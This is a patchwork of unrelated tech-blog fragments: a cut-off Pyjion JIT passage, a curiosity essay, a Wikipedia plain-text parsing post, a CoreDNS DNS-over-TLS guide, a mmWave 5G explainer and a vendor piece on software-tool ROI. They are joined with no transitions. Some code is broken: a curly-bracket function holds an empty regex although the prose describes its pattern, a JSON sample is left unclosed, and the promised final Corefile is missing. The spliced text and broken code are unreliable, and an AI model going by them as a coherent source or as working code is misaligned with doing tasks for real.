0000000a: MOV R14, [RDI+0x40]
0000000e: CALL 0x1b34
00000013: CMP DWORD [RAX+0x30], 0x0
00000017: JZ 0x31
00000019: CMP QWORD [RAX+0x40], 0x0
0000001e: JZ 0x31
00000020: MOV RDI, RAX
00000023: MOV RSI, RBX
00000026: XOR EDX, EDX
00000028: POP RBX
00000029: POP R14
...
</code></pre>

<p>The complex logic of converting a portable instruction set into low-level machine instructions is done by .NET’s CLR JIT compiler.</p>
<p>All Python code executed after the JIT is enabled will be compiled into native machine code at runtime and cached on disk. For example, to enable the JIT on a simple <code>app.py</code> for a Flask web app:</p>
<pre><code>import pyjion
pyjion.enable()

from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello, World!'

app.run()
</code></pre>

<p>That’s it.</p>
<h2>Will this be compatible with my existing Python code? What about C Extensions?</h2>
<p>The short answer is- if your existing Python code runs on CPython 3.9 – <strong>yes</strong> it will be compatible. To make sure, Pyjion has been tested against the full CPython “test suite” on all platforms. In fact, it was the first JIT ever to pass the test suite.</p>
<p>Thats because this isn’t a Python runtime, it uses the existing Python compiler to compile your code into Python bytecode (low level instructions).</p>
<p>Pyjion uses the same dynamic module loader as CPython, so if you import a Python extension from your virtual environment, it will work just the same in Pyjion.</p>
<h2>Project History</h2>
<p>Pyjion isn’t new. Brett Cannon and Dino Viehland started the Pyjion project 4 years ago. This was the first JIT to pass the full CPython test suite.
There were some limitations to the original proof-of-concept:</p>
<ul>
<li>Written against an old version of .NET Core</li>
<li>Required custom patches of .NET and compiling from source</li>
<li>Required custom patches of CPython and compiling from source</li>
<li>Only worked on Windows</li>
<li>It was written for Python 3.6 before PEP 523 was agreed and merged</li>
</ul>
<p>Has much changed since Python 3.6? To the average user, not really. But under the hood, the implementation of a few things has completely changed:</p>
<ul>
<li>Function calls</li>
<li>Iterators</li>
<li>Exception Handling</li>
<li>Dictionary, list and set comprehensions</li>
<li>Generators and coroutines</li>
</ul>
<p>Actually, a <strong>lot</strong> has changed in the last few releases of CPython. The new fork to get Pyjion working with the latest version of everything was a big undertaking…</p>
<p><img alt="not-much-has-changed" src="https://tonybaloney.github.io/img/posts-original/not-much-has-changed.png"></p>
<p>The goal with the latest patch was to get the project up to the condition of:</p>
<ul>
<li>Using the release binaries of .NET 5 and CPython 3.9</li>
<li>Making it work across all platforms</li>
<li>Implement the PEP523 interface</li>
<li>Implement all the new features of Python 3.9</li>
<li>Making the package “pip installable” from PyPi</li>
<li>Improving the test coverage</li>
<li>Adding a disassembler (both machine-code and CIL) to aid development</li>
</ul>
<h2>Is this faster?</h2>
<p>The short answer a little, but not by much (yet).</p>
<p>JIT compiling something …</p></div></div></div>

<p>There seems to be a strong, almost causal relationship between curiosity and creativity.</p>



<p>My hypothesis is that curious people constantly do three things that are essential for the creative process: exploring, observing and asking questions.</p>



<p><strong>Curious individuals are interested in nearly everything.</strong></p>



<p>They’re always learning about and exploring new subjects. As a result, they hold in their heads a wide-ranging reservoir of information and mental models. This allows them to cross-pollinate ideas, extrapolate concepts and make unexpected connections.</p>



<p><strong>Another thing they’re very good at is observing.&nbsp;</strong></p>



<p>Curious people tend to go through life at a different pace than everyone else. They move relatively slowly. And whenever something catches their attention, they stop to contemplate it. Their ability to look extensively at and into things allows them to unveil patterns that most people are too busy to see.</p>



<p><strong>Finally, curious people like to ask tons of questions.</strong></p>



<p>As everything else, questions are subject to probabilities — the more questions you ask, the higher your chances of asking a good question. Good questions, in turn, help them find things that don’t work or don’t make sense. Thus, opening the doors for breakthroughs and innovation.</p>



<p>By giving yourself permission to cultivate curiosity, you’re also laying the foundation for a prolific, creative life.</p>

<section id="main_content">


<p>I’m working on a project where I want to have an offline encyclopedia. It’s for training deep learning networks so it needs to be in plain text English. 
No markup, no special characters. Human readable without any interpreters, renderers, or parsers. I’ve got plenty of disk space, so that’s not a concern. 
Once I parse out all the Wikipedia articles I can get my hands on, I will create an index. Or I might index them into SOLR or something like that. Not sure yet.
I’m also going to implement it as a resource for a massive <a href="https://towardsdatascience.com/building-a-question-answering-system-part-1-9388aadff507">SQUAD repo</a>. I have uploaded a copy of the final result to <a href="https://www.kaggle.com/ltcmdrdata/plain-text-wikipedia-202011">Kaggle Datasets</a>. I’ve stashed the script in a <a href="https://github.com/daveshap/PlainTextWikipedia">dedicated repo on GitHub</a>.</p>



<p>The first thing I should have learned is that Wikipedia is written in a demented Frankenstein language called WikeMedia Text. It’s a hybrid of HTML/XML and Markdown. 
It has no consistency and is the worst example of spaghetti code I’ve ever seen. I’m sure there are better implementations today, but I can see how and why it ended up the way it did.
For instance, you need to be able to create robust references and links, so the URL syntax is way jacked. It relies on a lot of procedural generation at display time.
Personally, if it were done again today, I think something like Jekyll would be way better. Instead of rendering again and again every time someone visits a page, render it once after each edit.
But that’s just me. So instead we’re left with this horrible hybrid language that should die in a fire.</p>

<p>Fine, it is what it is. I’m an expert automator, dammit, and if a machine can automatically render this nonsense, then I sure as hell can <strong>unrender it</strong>.</p>

<h2 id="attempt-1---brute-force-regex">Attempt 1 - Brute Force Regex</h2>

<p>“Brute Force Regex” (BFR) is not a real thing. It’s just something I’ve been doing for years now in my automation habits. Usually, as a naive approach, I’ll try and do some 
search-and-replace jiggery pokery to just remove unwanted junk. Sometimes this is textual formatting, like brackets around tables or other HTML tags. 
So I ended up with the following function. Caution, it’s not pretty. This was just an experiment, and I wanted to share it so you would see what doesn’t work.</p>

<div><div><pre><code><span>def</span> <span>basic_replacements</span><span>(</span><span>text</span><span>):</span>
    <span>replacements</span> <span>=</span> <span>[</span>
    <span>(</span><span>'&amp;lt;'</span><span>,</span><span>'&lt;'</span><span>),</span>
    <span>(</span><span>'&amp;gt;'</span><span>,</span><span>'&gt;'</span><span>),</span>
    <span>(</span><span>'&amp;quot;'</span><span>,</span><span>'"'</span><span>),</span>
    <span>(</span><span>"'''"</span><span>,</span><span>' = '</span><span>),</span>
    <span>(</span><span>"'{2,}"</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'</span><span>\n</span><span>'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>r'\n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'r</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>),</span>
    <span>(</span><span>'&lt;ref.*?&gt;'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'&lt;/ref&gt;'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'http.*?\s'</span><span>,</span><span>''</span><span>),</span>
    <span>(</span><span>'\s+'</span><span>,</span><span>' '</span><span>),</span>
    <span>]</span>
    <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>'</span><span>\\</span><span>n'</span><span>,</span><span>' '</span><span>)</span>
    <span>for</span> <span>r</span> <span>in</span> <span>replacements</span><span>:</span>
        <span>text</span> <span>=</span> <span>re</span><span>.</span><span>sub</span><span>(</span><span>r</span><span>[</span><span>0</span><span>],</span> <span>r</span><span>[</span><span>1</span><span>],</span> <span>text</span><span>)</span>
    <span>return</span> <span>text</span>
</code></pre></div></div>

<p>I came up with this scheme because, at first glance, WikiMedia Text looked like a mixture of some basic HTML and some Markdown. 
I figured I could handle it with some basic regex replacements. This worked… to an extent. There were a few problems with it though.</p>

<ol>
  <li>Couldn’t handle nested square brackets or curly brackets, and it turns out there are a lot of those</li>
  <li>Quickly became intractable when I encountered escaped unicode literals like <code>\u2013</code>. They are frigging everywhere.</li>
</ol>

<p>So I wrote two more functions to try and tackle the bracketed stuff. These are things like links, citations, and pictures. Since I want a text-only Wikipedia, 
I really just needed to strip it all away.</p>

<div><div><pre><code><span>def</span> <span>remove_double_curly</span><span>(</span><span>text</span><span>):</span>
    <span>while</span> <span>True</span><span>:</span>
        <span>before</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>text</span> <span>=</span> <span>re</span><span>.</span><span>sub</span><span>(</span><span>''</span><span>,</span> <span>''</span><span>,</span> <span>text</span><span>)</span> 
        <span>after</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>if</span> <span>before</span> <span>==</span> <span>after</span><span>:</span>
            <span>return</span> <span>text</span>


<span>def</span> <span>remove_double_brackets</span><span>(</span><span>text</span><span>):</span>
    <span>while</span> <span>True</span><span>:</span>
        <span>before</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>double_brackets</span> <span>=</span> <span>re</span><span>.</span><span>findall</span><span>(</span><span>'\[\[.*?\]\]'</span><span>,</span> <span>text</span><span>)</span>
        <span>for</span> <span>db</span> <span>in</span> <span>double_brackets</span><span>:</span>
            <span>if</span> <span>'|'</span> <span>in</span> <span>db</span><span>:</span>
                <span>new</span> <span>=</span> <span>db</span><span>.</span><span>split</span><span>(</span><span>'|'</span><span>)[</span><span>-</span><span>1</span><span>].</span><span>strip</span><span>(</span><span>']'</span><span>)</span>
                <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>db</span><span>,</span> <span>new</span><span>)</span>
            <span>else</span><span>:</span>
                <span>new</span> <span>=</span> <span>db</span><span>.</span><span>strip</span><span>(</span><span>'['</span><span>).</span><span>strip</span><span>(</span><span>']'</span><span>)</span>
                <span>text</span> <span>=</span> <span>text</span><span>.</span><span>replace</span><span>(</span><span>db</span><span>,</span> <span>new</span><span>)</span>
        <span>after</span> <span>=</span> <span>len</span><span>(</span><span>text</span><span>)</span>
        <span>if</span> <span>before</span> <span>==</span> <span>after</span><span>:</span>
            <span>return</span> <span>text</span>
</code></pre></div></div>

<p>These functions worked-ish. You might notice the carat <code>^</code> in the curly function. This told it to match anything except another open curly bracket. This forced it to find the
innermost nested curly brackets. Again, this mostly worked, but it failed a few times and I gave up trying to figure out why. The square brackets are a bit different, as
they tend not to be nested but the inner syntax could be several different things. I opted for the simplest possible way and even so, it missed a few things. No idea why.</p>

<h2 id="attempt-15---literal-evals">Attempt 1.5 - Literal Evals</h2>

<p>I suppose I should rewind and give some context. Wikipedia dump files are effing huge. Even with 32GB of RAM on my desktop, I was rapidly running out of memory just 
loading one chunk at a time. So that meant I had to read each file line by line. Like so:</p>

<div><div><pre><code><span>with</span> <span>open</span><span>(</span><span>file</span><span>,</span> <span>'r'</span><span>,</span> <span>encoding</span><span>=</span><span>'utf-8'</span><span>)</span> <span>as</span> <span>infile</span><span>:</span>
    <span>for</span> <span>line</span> <span>in</span> <span>infile</span><span>:</span>
        <span>line</span> <span>=</span> <span>literal_eval</span><span>(</span><span>f'"""</span><span>{</span><span>line</span><span>}</span><span>"""'</span><span>)</span>  <span># this works... sometimes
</span>        <span>if</span> <span>'&lt;page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># new article
</span>            <span>article</span> <span>=</span> <span>''</span>
        <span>elif</span> <span>'&lt;/page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># end of article
</span>            <span>article</span> <span>+=</span> <span>line</span>
</code></pre></div></div>

<p>This works great for just reading the thing one at a time. One consistency in the Wikipedia dumps is that every page starts and ends with <code>&lt;page&gt;</code> and <code>&lt;/page&gt;</code> respectively.
This served as a great demarcation. So I tried to handle the unicode literals as they were coming in with <a href="https://www.kite.com/python/docs/ast.literal_eval">ast.literal_eval</a>. 
Spoiler: It worked. A little bit. This function frequently bombs out for various reasons.</p>

<h2 id="attempt-2---existing-parsers">Attempt 2 - Existing Parsers</h2>

<p>I finally gave up on manually parsing WikiMedia Text and found some extant parsers. First up is <a href="https://pypi.org/project/wikitextparser/">wikitextparser</a> which, as of this writing, is actively maintained.
Second up was the simple <a href="https://pypi.org/project/html2text/">html2text</a> which got some of the stuff the first missed. These premade parsers are great in that they 
don’t require me to use any of my own brain power! They are, however, far slower than my regex replace functions. It can’t be avoided, though.</p>

<p>So now my output looks more like this:</p>

<div><div><pre><code><span>[</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"4413617"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"The Samajtantrik Sramik Front is a national trade union federation in Bangladesh. It is affiliated with the World Federation of Trade Unions..."</span><span>,</span><span>
  </span><span>"title"</span><span>:</span><span> </span><span>"Samajtantrik Sramik Front"</span><span>
 </span><span>},</span><span>

<p>It’s much cleaner and moving in the right direction but I still have to figure out the literal eval reliably and a few square brackets are making it through as well. 
These premade parsers are far slower but one advantage of cleaning up Wikipedia articles is that they end up far smaller without the markup. If you just want the accumulated 
knowledge in plain text format, it ends up being a fraction of the size.</p>



<p>I can tolerate a few aberrations here and there but the perfectionist in me wants to do better. Anyways, here’s my script as it stands today:</p>

<p>It’s not the most elegant solution but for just over 100 lines of code, it will parse almost all of Wikipedia and save it to 40MB chunks of JSON.
Running this script looks like the following:</p>

    <p><time>November 27, 2020</time></p><div>
        <p>Although <a href="https://transparencyreport.google.com/https/overview?hl=en&amp;time_os_region=chrome-usage:1;series:time;groupby:os&amp;lu=load_os_region&amp;load_os_region=chrome-usage:1;series:page-load;groupby:os">an increasing portion of the web is adopting HTTPS</a>, a core part of the web infrastrcture lags behind in the form of plaintext DNS. The authentication problem of DNS is resolved by DNSSEC, but the queries are still plaintext. There’s currently a number of competing solutions that offer both authenticity and privacy concerns, namely DNS-over-TLS, DNS-over-HTTPS, and <a href="https://dnscrypt.info/">DNSCrypt</a>. I’ll leave it to Cloudflare’s blog to explain DNS, DoT and DoH, and the work towards both: <a href="https://blog.cloudflare.com/dns-encryption-explained/">DNS Encryption Explained</a>. Due to operating systems not yet supporting encrypted DNS resolvers, some work needs to be done by the user, and this post describes part of the work using <a href="https://coredns.io/">CoreDNS</a>.</p>
<p>CoreDNS is pluggable DNS and service discovery server written in Go and the blessed DNS resolver of Kubernetes. Configuring CoreDNS is handled via setting up a series of <a href="https://coredns.io/plugins/">middlewares</a> in the Corefile, which is what its config file is called. The <a href="https://coredns.io/manual/toc/">CoreDNS Manual</a> page does a brilliant job describing what CoreDNS is, how it works, how to install it, the structure of the configuration file, and more. To build our secure resolver, let’s pick up one of the examples off that page and gradually build the enhanced version.</p>
<p>Start by creating a file named <code>Corefile</code> containing the following, which is lifted verbatim from CoreDNS website:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span></code></pre></td>
<td>
<pre><code data-lang="caddyfile"><span>.</span> <span>{</span>
    <span>forward</span> <span>.</span> <span>8</span><span>.8.8.8</span> <span>9</span><span>.9.9.9</span>
    <span>log</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>This is very simple, but let’s break it apart. The <code>.</code> means listen on port 53, the default port for UDP DNS, and across all interfaces. The configuration instructs CoreDNS to forward all requests to either <code>8.8.8.8</code> (Google DNS) or <code>9.9.9.9</code> (Quad9), picking either of them at random, and logs everything to stdout. This is not secure yet. This setup will forward all DNS queries in plaintext UDP packets. Let’s start by forwarding everything to <a href="https://developers.google.com/speed/public-dns/docs/dns-over-tls">Google DNS over TLS</a> resolvers without fallback:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span></code></pre></td>
<td>
<pre><code data-lang="caddyfile"><span>.</span> <span>{</span>
    <span>forward</span> <span>.</span> <span>tls://8.8.8.8</span> <span>tls://8.8.4.4</span> <span>{</span><span>
</span><span>		# This tells CoreDNS the subject name
</span><span>		# on the certificate is: dns.google
</span><span></span>		<span>tls_servername</span> <span>dns.google</span>
	<span>}</span>
    <span>log</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>At this point the setup has redundancy against Google’s services only. What if Google DNS service is down? The possibiity of a service going down is not far fetched, and we must account for it. However, note how the <code>tls_servername</code> directive can only be defined once, so it is bound to whatever upstream IP address we’re using. We can get around this by breaking the upstream into more local resolvers. I’ll add Cloudflare DNS as backup:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span></code></pre></td>
<td>
<pre><code data-lang="caddyfile"><span>.:53</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>127.0.0.1</span><span>:</span><span>5301</span> <span>127.0.0.1</span><span>:</span><span>5302</span> <span>[</span><span>::1</span><span>]</span><span>:5301</span> <span>[</span><span>::1</span><span>]</span><span>:5302</span>
	<span>log</span>
<span>}</span>
<span>.:5301</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>tls://8.8.8.8</span> <span>tls://8.8.4.4</span> <span>{</span>
		<span>tls_servername</span> <span>dns.google</span>
	<span>}</span>
<span>}</span>
<span>.:5302</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>tls://1.1.1.1</span> <span>tls://1.0.0.1</span> <span>{</span>
		<span>tls_servername</span> <span>cloudflare-dns.com</span>
	<span>}</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>Now we have established the pattern. To add more backups, add more server blocks where the upstream is defined and the respective <code>tls_servername</code> is configured, and add the localhost IP address to the main server of <code>.:53</code>. This can be further enhanced by adding caching, prefetching, and loading the <code>hosts</code> file. The final setup will look like this:</p>

</code></pre></td></tr></tbody></table>
</div>
</div><p>Note that <code>policy</code> directive added in the first server block. Using <code>random</code> is superfluous because it is the default policy. The other policies available are <code>sequential</code> and <code>round_robin</code>. Regardless of the configured policy, CoreDNS will still perform health-checks and use a healthy upstream, so your queries are still answered even if one Google and/or Cloudflare are down. Configure your operating system to use your loopback address as the DNS server, set up CoreDNS service to start at boot, and your DNS queries are secure going forward.</p>

<p>For the past few years we’ve been hearing about mmWave 5G and now, in 2020 it’s finally here! mmWave 5G promises amazing speeds of 10 Gigabits/second, very low latency of around 1 millisecond, and many other amazing features. It currently operates in the frequency range between 24 GHz and 40 GHz. </p>



<p>Verizon has deployed this technology in many major cities across the USA. Here is a map that shows Verizon’s mmWave or <a rel="noreferrer noopener" href="https://www.verizon.com/about/news/fastest-5g-network-world-just-got-bigger-and-better" target="_blank">Ultra Wideband 5G</a> deployments.  </p>







<figure><img loading="lazy" width="1024" height="399" src="https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-1024x399.png" alt="" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-1024x399.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-300x117.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-768x299.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-1536x598.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G.png 2031w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>mmWave 5G or 5G Ultra Wideband deployments in USA</figcaption></figure>



<p>While mmWave 5G deployments have been limited to date, they will grow over time. Verizon will also be deploying Sub-6 GHz 5G networks this year. As the name suggests these networks will be deployed at frequencies below 6 GHz. </p>



<p>In 2020 we have also seen many new 5G phones – some of which <a href="https://amzn.to/3ffJ30C">support mmWave</a> and <a href="https://amzn.to/3923Cwy">others that don’t</a>.</p>



<h4><strong>The biggest differences between mmWave 5G and all other wireless systems</strong></h4>



<p>As the name suggests, mmWave 5G operates at mmWave frequencies starting at 24 GHz. Why do we need to move to mmWave frequencies? To support higher upload and download speeds we need more bandwidth. A single channel of mmWave 5G can be 400 MHz wide. That large amount of contiguous bandwidth is simply not available at lower frequencies as almost all the spectrum has already been allocated for other applications. </p>



<p>The picture below shows the bandwidth of 5G systems relative to other cellular technologies. </p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-1024x236.png" alt="" width="690" height="159" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-1024x236.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-300x69.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-768x177.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths.png 1446w" sizes="(max-width: 690px) 100vw, 690px"><figcaption>Bandwidths of cellular technologies</figcaption></figure></div>



<p>The maximum bandwidth of 5G is 20 times larger than the maximum bandwidth of a 4G signal. That makes sense when you compare the theoretical maximum achievable speed of a 4G network at 300 Mbps with that of a 5G network at 10,000 Mbps.  </p>



<h4><strong><span>Let’s now take a look at some of the major RF related challenges with mmWave 5G relative to previous generations of wireless systems</span></strong></h4>



<h3><strong>Radio Signals in the Real World</strong></h3>



<p>To put things in context, we have never operated our cellular communication systems at mmWave frequencies. The highest we have operated at is around 2 GHz for 4G systems and 6 GHz for Wi-Fi systems.</p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-1024x576.png" alt="" width="669" height="376" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-1024x576.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-300x169.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-768x432.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-1536x864.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges.png 1600w" sizes="(max-width: 669px) 100vw, 669px"><figcaption>Frequency ranges for different wireless technologies</figcaption></figure></div>



<p>The only wireless systems we have implemented at mmWave frequencies are point-to-point, line-of-sight links. We will, for the first time ever, have to deal with operating in challenging mmWave RF environments. </p>



<p>What does that mean?</p>



<p>mmWave signals don’t propagate very far. They are in fact obstructed by even the smallest of objects on account of their small wavelength. Trees, buildings, moisture – all affect mmWave signal propagation. As a result, cities and suburbs are very challenging environments from a mmWave perspective. </p>



<div><figure><img loading="lazy" width="1024" height="576" src="https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-1024x576.png" alt="" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-1024x576.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-300x169.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-768x432.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-1536x864.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Things that affect mmWave 5G signals</figcaption></figure></div>



<p>So how do we propose to solve the problem? The plan is to deploy about five times as many 5G base stations as with 4G and to use a technology called beamforming. As the name suggests this focuses RF energy beams in specific directions – toward users in particular. </p>



<p>However there still remains the fact that we have a relatively poor understanding of how exactly RF behaves at these frequencies in city environments where things change fast. Buildings and other structures appear relatively quickly and sometimes unexpectedly. The behavior of RF signals will then change accordingly and often unpredictably.</p>



<p>Unlike with previous systems operating at 2 GHz, we have not had the benefit of four decades of research and development. We have barely had two years to develop an understanding of how mmWave will work.</p>



<h3><strong>Complex Phone Development</strong></h3>



<p>The average phone today has multiple wireless sub-systems operating in it. Everything from 2G to 4G with Wi-Fi, Bluetooth, NFC and sometimes even FM. In small cell phone dimensions this is potentially chaos from an RF standpoint with signals interfering with one another. Increased power consumption of mmWave components is another significant issue as it results in more heat dissipation and lower battery life.</p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/phone-with-multiple-standards.png" alt="" width="332" height="373" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/phone-with-multiple-standards.png 703w, https://www.onesdr.com/wp-content/uploads/2020/11/phone-with-multiple-standards-267x300.png 267w" sizes="(max-width: 332px) 100vw, 332px"><figcaption>Different wireless technologies in a phone today</figcaption></figure></div>



<h3><strong>Higher Build and Development Costs</strong></h3>



<p>mmWave phones have multiple RF antenna modules designed to improve signal reception – a complex task without a doubt. Each of these has its own amplification, power management and transceiver. This complexity adds to the cost of hardware and results in a factor of <a href="https://benchmarking.ihsmarkit.com/614670/the-first-5g-phone-in-the-united-states-is-a-compromise-of-cost-and-design-ihs-markit-says" target="_blank" rel="noreferrer noopener">three times higher</a> relative to the average 4G smartphone.</p>



<p><a href=""></a>What about testing mmWave phones on the manufacturing floor? As mentioned earlier, most of our wireless communication systems have been operating below 2 GHz. Even when you consider Wi-Fi, we don’t get any higher than 6 GHz. There are a number of RF testing products such as <a href="https://amzn.to/3fg0luz">spectrum analyzers </a>and <a href="https://amzn.to/2UFEG5N">signal generators</a> that operate up to 6 GHz. They are not very expensive. 5G mmWave however requires test equipment that has to cover 40 GHz at least. Such equipment can cost as much as $100,000 or more. Not very affordable at all.</p>



<h2><strong>Summary</strong></h2>



<p>In this post we have talked about some of the RF challenges that we need to overcome to make mmWave 5G a success. We provided an overview of about three broad areas: RF propagation, Phone hardware and Development costs. The challenges in each of these areas are very daunting but exciting at the same time.</p>

<p><em>“Should I buy this or not?”</em> Ever since the invention of money (and even before that), this very sensible question accompanies our buying decision. And of course not only for cars, handbags, and trampolines – but also when it comes to buying <strong>software tools</strong>.</p>



<p>I’m no expert when it comes to cars, handbags, and trampolines – but as the CEO and founder of “<a href="https://www.git-tower.com/?utm_source=sourcelevel&amp;utm_medium=guestpost&amp;utm_campaign=roi-of-software-tools">Tower</a>” (a desktop GUI for the Git version control system), I have both opinions and some expertise when it comes to SaaS software tools. Of course, my background in a small software company means that I’m highly biased in this matter! But I want to invite you to consider if my <em>arguments</em> might be true, independent of my own bias.</p>



<h2>The ROI of Software Tools is Almost Always Fantastic</h2>



<p>Here is my bold statement: in many cases, <strong>the return on investment is fantastic when it comes to software tools you use for your work</strong>. Let me tell you why I am so convinced that this is true.</p>



<h2>The Benefits of Good Software Tools</h2>



<p>Great software tools come with a host of benefits:</p>



<ol><li><strong>They make you more productive.</strong> For your private purposes, it might be enough if you keep track of tasks you have to do in a simple text file (or even on a piece of paper). But when it comes to your professional work – and especially in a team context – these overly simplistic solutions just won’t cut it. In our team, we are using “<a href="https://www.asana.com/">Asana</a>” to keep track of tasks and projects. And it would be so much harder and cost so much more time if we tried to do this manually! The same logic is true for a tool like “<a href="https://sourcelevel.io/">SourceLevel</a>“: instead of manually pulling together data from various sources, it helps you get a thorough overview of your Pull Request and Code Review metrics quicker and with less effort. <em>Not</em> using these tools – with the intention of trying to save a few bucks – very quickly backfires when it impairs your productivity (and more importantly: the productivity of your whole team)!</li><li><strong>They allow you to do things you couldn’t do without them.</strong> Our own product is a perfect example for this statement: <a href="https://www.git-tower.com/?utm_source=sourcelevel&amp;utm_medium=guestpost&amp;utm_campaign=roi-of-software-tools">Tower, the Git desktop GUI</a> that we make, helps developers to access advanced features of the Git version control system – which, due to the high complexity and steep learning curve of Git, they wouldn’t be able to use (or wouldn’t even be aware of) without Tower. Many software developers claim to know Git. But when it comes to more advanced features like Interactive Rebase, Submodules, or the Reflog, they either don’t know/ don’t use them – or they simply can’t use them efficiently. Anyone who has ever performed an Interactive Rebase operation, with its many manual steps, quickly comes to love Tower, where the same operation is possible via simple drag and drop!</li><li><strong>They reduce mistakes.</strong> I can vividly remember the stress and the anxiety I used to feel when I had to update our website: I would connect to our live server with an FTP program and replace some files with updated versions. This is the equivalent of open heart surgery, which means that a fair amount of stress is not surprising: there are a lot of things that can go wrong and cause a real mess! This whole scenario, for us, lies many years in the past and looks very different from how we do things today: for our marketing websites, we’re using a service called “<a href="https://deploybot.com/">Deploybot</a>” that makes this process a lot easier. And to run the build process for our main Tower app, we’re using the popular “<a href="https://travis-ci.org/">Travis CI</a>” service. Using both of these services (instead of doing things manually) has greatly reduced our error rate – and thereby saved us lots of hours of putting out fires.</li><li><strong>They free your time for more important work.</strong> As the CEO of a small tech company, my schedule is naturally pretty busy. And as anyone knows who has ever tried to find time on <em>multiple</em> people’s calendars: this is really time consuming work! Offering multiple alternative dates that block your calendar for days, looping in multiple people in multiple time zones, and all the back-and-forth emailing connected with this make these things a true nightmare. This is why I’m happily paying a hundred bucks for a yearly subscription of “<a href="https://calendly.com/">Calendly</a>” In a nutshell, this service allows me to share my availability and leave it to the other party / parties to pick a date and time that’s convenient for them. This completely takes away all of the ugly back-and-forth! And on top of that, it allows the other party to choose very freely and conveniently. This has freed up hours of my time that I can now use for more important work!</li></ol>



<hr>



<p>It’s hard to put a concrete dollar value to the above benefits. But if you think <em>any</em> of them through, you will quickly see that many software tools are a true bargain – they make you more productive, allow you to do things you couldn’t do without them, reduce mistakes, and free your time for more important work. All of this makes for a terribly great return on investment!</p>



<h2>Common Objections</h2>



<p>Let’s not ignore the haters, doubters, and nay-sayers and address some common objections.</p>



<blockquote><p>“It’s too expensive!”</p></blockquote>



<p>Let’s take our own tool, the “Tower” Git GUI, as an example.</p>



<ul><li>A license costs between 69 and 99 USD per user per year.</li><li>Our customers are professional software developers in companies large and small as well as freelance programmers.</li><li>The value that Tower delivers is that it makes software developers more productive: it helps them reduce mistakes and get access to the more advanced features that allow them to produce higher-quality software.</li></ul>



<p>The average software developer’s salary varies wildly, but it’s somewhere between 40,000 and 150,000 USD per year. The math here is very simple: if such a tool can help a developer save just <em>a couple of minutes</em> or prevent <em>just 1-2 errors</em> every month – by adding a meager 69 USD to that 40,000 USD yearly cost – the software tool has already paid for itself!</p>



<p>The same argument holds true for almost <em>any</em> knowledge worker: compared to the salaries of well-educated people, the costs of most software tools are extremely low, almost negligible. This means that they earn back their money very quickly! Either in productivity or any of the other benefits that I mentioned above.</p>



<blockquote><p>“I don’t need a tool for that.”</p></blockquote>



